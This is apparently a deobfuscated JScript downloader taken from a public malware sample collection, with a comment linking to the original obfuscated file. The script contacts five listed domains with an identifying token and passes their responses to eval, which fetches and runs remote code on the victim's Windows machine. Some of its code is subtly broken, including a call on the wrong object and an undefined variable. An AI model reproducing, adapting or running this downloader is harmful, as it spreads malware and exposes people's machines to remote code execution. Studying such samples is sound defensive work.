var m = "rZYE8RAsgNju4fJh6NMfHNi8ZIh2QU3-BjUKqGjwedXe5314REYOTQrvgMlENjM_vjMld0S-Wucn9Ep8XnM";
var x = new Array("tulzaevents.com", "businessfilings-online-forms.com", "leonbacchus.com", "iveybusiness.vmnow.co", "pacificwinemg.com");


function deobfuscated(){
    for(var i =0; i < x.length; i++){
        var xhttp  = new ActiveXObject("Msxml2.XMLHTTP");
        try{
            xhttp.open("GET","http://"+x[i]+"/counter/?"+m,false);
            xhttp.send();
            var res = xhttp.responseText;
            if(res.length > 1000 && res.indexOf(m) > -1){
                eval(res.responseText.split(m).join(a));
            }

        }catch(e){

        }
    }
}

deobfuscated();

//  original obfuscated link
//  https://github.com/HynekPetrak/javascript-malware-collection/blob/master/2017/20170302/20170302_62a7cd7b44ecf34e189522f1484ba399.js
